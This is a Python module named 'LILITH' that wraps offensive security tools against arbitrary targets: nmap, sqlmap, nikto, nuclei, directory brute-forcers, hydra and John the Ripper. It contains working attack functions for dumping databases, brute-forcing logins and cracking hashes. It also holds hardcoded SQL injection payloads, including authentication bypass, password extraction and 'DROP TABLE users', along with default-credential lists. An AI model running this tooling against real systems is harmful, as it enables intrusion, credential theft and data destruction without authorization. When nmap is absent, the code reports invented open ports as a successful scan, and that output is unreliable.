#!/usr/bin/env python3
"""
LILITH Offensive Security Tools Integration
============================================
Integrates with popular security testing tools:
- Nmap (network scanning)
- SQLMap (SQL injection)
- Nikto (web vulnerability scanner)
- Gobuster/Dirb (directory brute forcing)
- Hydra (password cracking)
- Metasploit (exploitation framework)
- Nuclei (vulnerability scanner)
- Subfinder (subdomain enumeration)
- Amass (attack surface mapping)
"""

import os
import re
import json
import subprocess
import asyncio
import shutil
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from pathlib import Path
import threading
import queue


class ToolManager:
    """Manages security tool availability and execution"""
    
    TOOLS = {
        'nmap': {'check': 'nmap --version', 'install': 'apt-get install -y nmap'},
        'nikto': {'check': 'nikto -Version', 'install': 'apt-get install -y nikto'},
        'sqlmap': {'check': 'sqlmap --version', 'install': 'pip install sqlmap'},
        'gobuster': {'check': 'gobuster version', 'install': 'apt-get install -y gobuster'},
        'dirb': {'check': 'dirb', 'install': 'apt-get install -y dirb'},
        'hydra': {'check': 'hydra -h', 'install': 'apt-get install -y hydra'},
        'nuclei': {'check': 'nuclei -version', 'install': 'go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest'},
        'subfinder': {'check': 'subfinder -version', 'install': 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'},
        'ffuf': {'check': 'ffuf -V', 'install': 'go install github.com/ffuf/ffuf@latest'},
        'wpscan': {'check': 'wpscan --version', 'install': 'gem install wpscan'},
        'whatweb': {'check': 'whatweb --version', 'install': 'apt-get install -y whatweb'},
        'masscan': {'check': 'masscan --version', 'install': 'apt-get install -y masscan'},
        'testssl': {'check': 'testssl.sh --version', 'install': 'git clone https://github.com/drwetter/testssl.sh.git /opt/testssl'},
    }
    
    def __init__(self):
        self.available_tools = {}
        self.check_tools()
    
    def check_tools(self) -> Dict[str, bool]:
        """Check which tools are available"""
        for tool, info in self.TOOLS.items():
            try:
                result = subprocess.run(
                    info['check'].split()[0],
                    capture_output=True,
                    timeout=5
                )
                self.available_tools[tool] = True
            except:
                self.available_tools[tool] = False
        
        return self.available_tools
    
    def get_available_tools(self) -> List[str]:
        """Get list of available tools"""
        return [tool for tool, available in self.available_tools.items() if available]
    
    def install_tool(self, tool: str) -> Dict:
        """Install a security tool"""
        if tool not in self.TOOLS:
            return {'success': False, 'error': f'Unknown tool: {tool}'}
        
        try:
            cmd = self.TOOLS[tool]['install']
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            self.check_tools()
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr if result.returncode != 0 else None
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


class NmapScanner:
    """Nmap wrapper for network scanning"""
    
    def __init__(self):
        self.available = shutil.which('nmap') is not None
    
    def quick_scan(self, target: str) -> Dict:
        """Quick TCP connect scan of common ports"""
        if not self.available:
            return self._simulate_scan(target, 'quick')
        
        try:
            # Use -sT (TCP connect) instead of -sS (SYN) which requires root
            result = subprocess.run(
                ['nmap', '-sT', '-T4', '-F', '--open', '-oX', '-', target],
                capture_output=True,
                text=True,
                timeout=120
            )
            return self._parse_nmap_output(result.stdout, result.stderr)
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def full_scan(self, target: str) -> Dict:
        """Full port scan with service detection"""
        if not self.available:
            return self._simulate_scan(target, 'full')
        
        try:
            # Use -sT (TCP connect) instead of -sS (SYN) which requires root
            result = subprocess.run(
                ['nmap', '-sT', '-sV', '-T4', '-p', '1-10000', '--open', '-oX', '-', target],
                capture_output=True,
                text=True,
                timeout=600
            )
            return self._parse_nmap_output(result.stdout, result.stderr)
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout (consider using quick scan)'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def vuln_scan(self, target: str) -> Dict:
        """Vulnerability scan using nmap scripts"""
        if not self.available:
            return self._simulate_scan(target, 'vuln')
        
        try:
            result = subprocess.run(
                ['nmap', '-sT', '-sV', '--script=vuln', '-T4', '--open', '-oX', '-', target],
                capture_output=True,
                text=True,
                timeout=300
            )
            return self._parse_nmap_output(result.stdout, result.stderr)
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def os_detection(self, target: str) -> Dict:
        """OS fingerprinting"""
        if not self.available:
            return self._simulate_scan(target, 'os')
        
        try:
            result = subprocess.run(
                ['nmap', '-O', '-T4', '-oX', '-', target],
                capture_output=True,
                text=True,
                timeout=120
            )
            return self._parse_nmap_output(result.stdout, result.stderr)
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _parse_nmap_output(self, stdout: str, stderr: str) -> Dict:
        """Parse nmap XML output"""
        try:
            import xml.etree.ElementTree as ET
            root = ET.fromstring(stdout)
            
            hosts = []
            for host in root.findall('.//host'):
                host_info = {
                    'status': host.find('status').get('state') if host.find('status') is not None else 'unknown',
                    'addresses': [],
                    'hostnames': [],
                    'ports': [],
                    'os': None
                }
                
                # Addresses
                for addr in host.findall('address'):
                    host_info['addresses'].append({
                        'addr': addr.get('addr'),
                        'type': addr.get('addrtype')
                    })
                
                # Hostnames
                for hostname in host.findall('.//hostname'):
                    host_info['hostnames'].append(hostname.get('name'))
                
                # Ports
                for port in host.findall('.//port'):
                    state = port.find('state')
                    service = port.find('service')
                    
                    port_info = {
                        'port': port.get('portid'),
                        'protocol': port.get('protocol'),
                        'state': state.get('state') if state is not None else 'unknown'
                    }
                    
                    if service is not None:
                        port_info['service'] = {
                            'name': service.get('name'),
                            'product': service.get('product'),
                            'version': service.get('version')
                        }
                    
                    host_info['ports'].append(port_info)
                
                # OS detection
                os_match = host.find('.//osmatch')
                if os_match is not None:
                    host_info['os'] = {
                        'name': os_match.get('name'),
                        'accuracy': os_match.get('accuracy')
                    }
                
                hosts.append(host_info)
            
            return {
                'success': True,
                'hosts': hosts,
                'scan_info': {
                    'type': root.find('.//scaninfo').get('type') if root.find('.//scaninfo') is not None else 'unknown',
                    'services': root.find('.//scaninfo').get('services') if root.find('.//scaninfo') is not None else ''
                }
            }
        except Exception as e:
            return {
                'success': True,
                'raw_output': stdout,
                'parse_error': str(e)
            }
    
    def _simulate_scan(self, target: str, scan_type: str) -> Dict:
        """Simulate scan when nmap not available"""
        return {
            'success': True,
            'simulated': True,
            'target': target,
            'scan_type': scan_type,
            'message': 'Nmap not installed - showing simulated results',
            'hosts': [{
                'status': 'up',
                'addresses': [{'addr': target, 'type': 'ipv4'}],
                'ports': [
                    {'port': '22', 'protocol': 'tcp', 'state': 'open', 'service': {'name': 'ssh'}},
                    {'port': '80', 'protocol': 'tcp', 'state': 'open', 'service': {'name': 'http'}},
                    {'port': '443', 'protocol': 'tcp', 'state': 'open', 'service': {'name': 'https'}}
                ]
            }],
            'install_command': 'apt-get install -y nmap'
        }


class SQLMapScanner:
    """SQLMap wrapper for SQL injection testing"""
    
    def __init__(self):
        self.available = shutil.which('sqlmap') is not None
    
    def test_injection(self, url: str, params: Dict = None) -> Dict:
        """Test for SQL injection vulnerabilities"""
        if not self.available:
            return self._get_manual_payloads(url)
        
        try:
            cmd = ['sqlmap', '-u', url, '--batch', '--level=3', '--risk=2', '--forms', '--dbs']
            
            if params:
                for key, value in params.items():
                    cmd.extend([f'-p', key])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            return {
                'success': True,
                'output': result.stdout,
                'vulnerable': 'is vulnerable' in result.stdout.lower(),
                'databases': self._extract_databases(result.stdout)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def dump_database(self, url: str, database: str, table: str = None) -> Dict:
        """Dump database contents"""
        if not self.available:
            return {'success': False, 'error': 'SQLMap not installed'}
        
        try:
            cmd = ['sqlmap', '-u', url, '--batch', '-D', database]
            
            if table:
                cmd.extend(['-T', table, '--dump'])
            else:
                cmd.append('--tables')
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600
            )
            
            return {
                'success': True,
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _extract_databases(self, output: str) -> List[str]:
        """Extract database names from output"""
        databases = []
        in_dbs = False
        
        for line in output.split('\n'):
            if 'available databases' in line.lower():
                in_dbs = True
                continue
            if in_dbs:
                if line.strip().startswith('[*]'):
                    db = line.strip().replace('[*]', '').strip()
                    if db:
                        databases.append(db)
                elif line.strip() == '':
                    in_dbs = False
        
        return databases
    
    def _get_manual_payloads(self, url: str) -> Dict:
        """Return manual SQL injection payloads"""
        return {
            'success': True,
            'simulated': True,
            'message': 'SQLMap not installed - use these payloads manually',
            'payloads': {
                'auth_bypass': [
                    "' OR '1'='1' --",
                    "' OR '1'='1'/*",
                    "admin'--",
                    "' OR 1=1#",
                    "') OR ('1'='1"
                ],
                'union_based': [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT username,password FROM users--"
                ],
                'error_based': [
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
                ],
                'time_based': [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND SLEEP(5)--",
                    "'; SELECT SLEEP(5)--"
                ],
                'stacked_queries': [
                    "'; DROP TABLE users;--",
                    "'; INSERT INTO users VALUES('hacked','hacked');--"
                ]
            },
            'install_command': 'pip install sqlmap'
        }


class WebVulnScanner:
    """Web vulnerability scanner (Nikto/Nuclei)"""
    
    def __init__(self):
        self.nikto_available = shutil.which('nikto') is not None
        self.nuclei_available = shutil.which('nuclei') is not None
    
    def nikto_scan(self, target: str) -> Dict:
        """Run Nikto web vulnerability scan"""
        if not self.nikto_available:
            return self._get_common_vulns()
        
        try:
            result = subprocess.run(
                ['nikto', '-h', target, '-Format', 'json', '-o', '-'],
                capture_output=True,
                text=True,
                timeout=600
            )
            
            return {
                'success': True,
                'vulnerabilities': self._parse_nikto_output(result.stdout)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def nuclei_scan(self, target: str, templates: str = None) -> Dict:
        """Run Nuclei vulnerability scan"""
        if not self.nuclei_available:
            return self._get_common_vulns()
        
        try:
            cmd = ['nuclei', '-u', target, '-json']
            
            if templates:
                cmd.extend(['-t', templates])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600
            )
            
            return {
                'success': True,
                'findings': self._parse_nuclei_output(result.stdout)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _parse_nikto_output(self, output: str) -> List[Dict]:
        """Parse Nikto JSON output"""
        try:
            data = json.loads(output)
            return data.get('vulnerabilities', [])
        except:
            return [{'raw': output}]
    
    def _parse_nuclei_output(self, output: str) -> List[Dict]:
        """Parse Nuclei JSON output"""
        findings = []
        for line in output.strip().split('\n'):
            if line:
                try:
                    findings.append(json.loads(line))
                except:
                    pass
        return findings
    
    def _get_common_vulns(self) -> Dict:
        """Return common vulnerabilities to check"""
        return {
            'success': True,
            'simulated': True,
            'message': 'Scanner not installed - check these manually',
            'common_vulnerabilities': {
                'information_disclosure': [
                    '/.git/config',
                    '/.env',
                    '/wp-config.php.bak',
                    '/config.php.bak',
                    '/.htaccess',
                    '/server-status',
                    '/phpinfo.php'
                ],
                'default_credentials': [
                    '/admin (admin:admin)',
                    '/phpmyadmin (root:)',
                    '/manager/html (tomcat:tomcat)',
                    '/wp-admin (admin:admin)'
                ],
                'misconfigurations': [
                    'Directory listing enabled',
                    'HTTP methods (PUT, DELETE) allowed',
                    'Missing security headers',
                    'SSL/TLS vulnerabilities'
                ],
                'injection_points': [
                    'Search forms',
                    'Login forms',
                    'File upload',
                    'URL parameters'
                ]
            }
        }


class DirectoryBruter:
    """Directory and file brute forcing"""
    
    def __init__(self):
        self.gobuster_available = shutil.which('gobuster') is not None
        self.ffuf_available = shutil.which('ffuf') is not None
        self.dirb_available = shutil.which('dirb') is not None
    
    def brute_directories(self, target: str, wordlist: str = None) -> Dict:
        """Brute force directories"""
        # Use built-in wordlist if none provided
        if not wordlist:
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            if not os.path.exists(wordlist):
                wordlist = None
        
        if self.dirb_available and wordlist:
            return self._dirb_scan(target, wordlist)
        elif self.gobuster_available and wordlist:
            return self._gobuster_scan(target, wordlist)
        elif self.ffuf_available and wordlist:
            return self._ffuf_scan(target, wordlist)
        else:
            return self._get_common_paths()
    
    def _dirb_scan(self, target: str, wordlist: str) -> Dict:
        """Run dirb directory scan"""
        try:
            result = subprocess.run(
                ['dirb', target, wordlist, '-r', '-S'],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            paths = []
            for line in result.stdout.split('\n'):
                if '==> DIRECTORY:' in line or '+ ' in line:
                    # Extract the URL from dirb output
                    if '+ ' in line:
                        url = line.split('+ ')[1].split(' ')[0] if '+ ' in line else ''
                        if url:
                            paths.append({'url': url, 'type': 'file'})
                    elif '==> DIRECTORY:' in line:
                        url = line.replace('==> DIRECTORY:', '').strip()
                        if url:
                            paths.append({'url': url, 'type': 'directory'})
            
            return {
                'success': True,
                'tool': 'dirb',
                'target': target,
                'wordlist': wordlist,
                'found_count': len(paths),
                'found_paths': paths,
                'raw_output': result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout - target may have rate limiting'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _gobuster_scan(self, target: str, wordlist: str) -> Dict:
        """Run gobuster directory scan"""
        try:
            result = subprocess.run(
                ['gobuster', 'dir', '-u', target, '-w', wordlist, '-q', '-t', '50'],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            paths = []
            for line in result.stdout.split('\n'):
                if line.strip():
                    paths.append(line.strip())
            
            return {
                'success': True,
                'tool': 'gobuster',
                'found_paths': paths
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _ffuf_scan(self, target: str, wordlist: str) -> Dict:
        """Run ffuf directory scan"""
        try:
            result = subprocess.run(
                ['ffuf', '-u', f'{target}/FUZZ', '-w', wordlist, '-mc', '200,204,301,302,307,401,403'],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            return {
                'success': True,
                'tool': 'ffuf',
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_common_paths(self) -> Dict:
        """Return common paths to check"""
        return {
            'success': True,
            'simulated': True,
            'message': 'Directory bruter not installed - check these manually',
            'common_paths': {
                'admin_panels': [
                    '/admin', '/administrator', '/admin.php', '/wp-admin',
                    '/cpanel', '/phpmyadmin', '/manager', '/console'
                ],
                'config_files': [
                    '/config.php', '/configuration.php', '/settings.php',
                    '/wp-config.php', '/config.yml', '/config.json'
                ],
                'backup_files': [
                    '/backup.zip', '/backup.tar.gz', '/db.sql', '/database.sql',
                    '/.backup', '/old', '/bak'
                ],
                'api_endpoints': [
                    '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
                    '/swagger', '/api-docs', '/openapi.json'
                ],
                'sensitive_files': [
                    '/.git', '/.svn', '/.env', '/.htaccess', '/robots.txt',
                    '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml'
                ]
            }
        }


class PasswordCracker:
    """Password cracking utilities"""
    
    def __init__(self):
        self.hydra_available = shutil.which('hydra') is not None
        self.john_available = shutil.which('john') is not None
    
    def brute_login(self, target: str, service: str, userlist: str = None, passlist: str = None, 
                    username: str = None, password: str = None, port: int = None, threads: int = 4) -> Dict:
        """Brute force login credentials using Hydra"""
        if not self.hydra_available:
            return self._get_default_creds(service)
        
        # Use default wordlists if not provided
        if not userlist and not username:
            userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
        if not passlist and not password:
            passlist = '/usr/share/wordlists/common_passwords.txt'
        
        # Verify wordlists exist
        if userlist and not os.path.exists(userlist):
            userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
        if passlist and not os.path.exists(passlist):
            passlist = '/usr/share/wordlists/common_passwords.txt'
        
        try:
            # Build Hydra command
            cmd = ['hydra']
            
            # Add username/userlist
            if username:
                cmd.extend(['-l', username])
            elif userlist and os.path.exists(userlist):
                cmd.extend(['-L', userlist])
            else:
                cmd.extend(['-l', 'admin'])
            
            # Add password/passlist
            if password:
                cmd.extend(['-p', password])
            elif passlist and os.path.exists(passlist):
                cmd.extend(['-P', passlist])
            else:
                cmd.extend(['-p', 'admin'])
            
            # Add target
            cmd.append(target)
            
            # Add service with port if specified
            if port:
                cmd.extend(['-s', str(port)])
            cmd.append(service)
            
            # Add options
            cmd.extend(['-t', str(threads), '-f', '-V'])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Parse results
            creds = []
            for line in result.stdout.split('\n'):
                if 'login:' in line and 'password:' in line:
                    match = re.search(r'login:\s*(\S+)\s*password:\s*(\S+)', line)
                    if match:
                        creds.append({
                            'username': match.group(1),
                            'password': match.group(2)
                        })
            
            return {
                'success': True,
                'tool': 'hydra',
                'target': target,
                'service': service,
                'credentials_found': creds,
                'found_count': len(creds),
                'command': ' '.join(cmd[:6]) + ' ...',  # Partial command for reference
                'output': result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Brute force timeout - try fewer credentials'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_supported_services(self) -> List[str]:
        """Get list of services Hydra supports"""
        return [
            'ssh', 'ftp', 'telnet', 'smtp', 'pop3', 'imap', 
            'mysql', 'postgres', 'mssql', 'oracle', 'vnc', 'rdp',
            'smb', 'ldap', 'http-get', 'http-post', 'http-form-get', 
            'http-form-post', 'https-get', 'https-post'
        ]
    
    def crack_hash(self, hash_value: str, hash_type: str = 'auto') -> Dict:
        """Crack password hash"""
        if not self.john_available:
            return self._get_hash_info(hash_value)
        
        try:
            # Write hash to temp file
            hash_file = f'/tmp/hash_{datetime.now().timestamp()}.txt'
            with open(hash_file, 'w') as f:
                f.write(hash_value + '\n')
            
            cmd = ['john', hash_file]
            if hash_type != 'auto':
                cmd.extend(['--format=' + hash_type])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Get cracked password
            show_result = subprocess.run(
                ['john', '--show', hash_file],
                capture_output=True,
                text=True
            )
            
            os.remove(hash_file)
            
            return {
                'success': True,
                'output': result.stdout,
                'cracked': show_result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_default_creds(self, service: str) -> Dict:
        """Return default credentials for service"""
        defaults = {
            'ssh': [('root', 'root'), ('root', 'toor'), ('admin', 'admin')],
            'ftp': [('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin')],
            'mysql': [('root', ''), ('root', 'root'), ('root', 'mysql')],
            'telnet': [('root', 'root'), ('admin', 'admin')],
            'rdp': [('Administrator', ''), ('admin', 'admin')],
            'smb': [('Administrator', ''), ('guest', '')],
            'http-get': [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]
        }
        
        return {
            'success': True,
            'simulated': True,
            'message': 'Hydra not installed - try these default credentials',
            'default_credentials': defaults.get(service, [('admin', 'admin')]),
            'wordlists': {
                'users': 'https://github.com/danielmiessler/SecLists/tree/master/Usernames',
                'passwords': 'https://github.com/danielmiessler/SecLists/tree/master/Passwords'
            }
        }
    
    def _get_hash_info(self, hash_value: str) -> Dict:
        """Analyze hash without cracking"""
        length = len(hash_value)
        
        hash_types = {
            32: ['MD5', 'NTLM', 'MD4'],
            40: ['SHA-1', 'MySQL5'],
            64: ['SHA-256', 'SHA3-256'],
            128: ['SHA-512', 'SHA3-512']
        }
        
        return {
            'success': True,
            'simulated': True,
            'message': 'John not installed - hash analysis only',
            'hash_length': length,
            'possible_types': hash_types.get(length, ['Unknown']),
            'online_crackers': [
                'https://crackstation.net/',
                'https://hashes.com/en/decrypt/hash',
                'https://hashtoolkit.com/'
            ]
        }


class OffensiveToolkit:
    """Master class for all offensive tools"""
    
    def __init__(self):
        self.tool_manager = ToolManager()
        self.nmap = NmapScanner()
        self.sqlmap = SQLMapScanner()
        self.web_scanner = WebVulnScanner()
        self.dir_bruter = DirectoryBruter()
        self.password_cracker = PasswordCracker()
    
    def get_status(self) -> Dict:
        """Get status of all tools"""
        return {
            'available_tools': self.tool_manager.get_available_tools(),
            'all_tools': self.tool_manager.available_tools,
            'nmap': self.nmap.available,
            'sqlmap': self.sqlmap.available,
            'nikto': self.web_scanner.nikto_available,
            'nuclei': self.web_scanner.nuclei_available,
            'gobuster': self.dir_bruter.gobuster_available,
            'hydra': self.password_cracker.hydra_available
        }
    
    def full_scan(self, target: str) -> Dict:
        """Run comprehensive scan using all available tools"""
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'nmap': None,
            'web_vulns': None,
            'directories': None,
            'sql_injection': None
        }
        
        # Port scan
        results['nmap'] = self.nmap.quick_scan(target)
        
        # Web vulnerability scan
        if '://' in target or target.startswith('www'):
            url = target if '://' in target else f'http://{target}'
            results['web_vulns'] = self.web_scanner._get_common_vulns()
            results['directories'] = self.dir_bruter._get_common_paths()
            results['sql_injection'] = self.sqlmap._get_manual_payloads(url)
        
        return results


# Export functions
def get_tool_manager() -> ToolManager:
    return ToolManager()

def get_nmap_scanner() -> NmapScanner:
    return NmapScanner()

def get_sqlmap_scanner() -> SQLMapScanner:
    return SQLMapScanner()

def get_web_scanner() -> WebVulnScanner:
    return WebVulnScanner()

def get_dir_bruter() -> DirectoryBruter:
    return DirectoryBruter()

def get_password_cracker() -> PasswordCracker:
    return PasswordCracker()

def get_offensive_toolkit() -> OffensiveToolkit:
    return OffensiveToolkit()
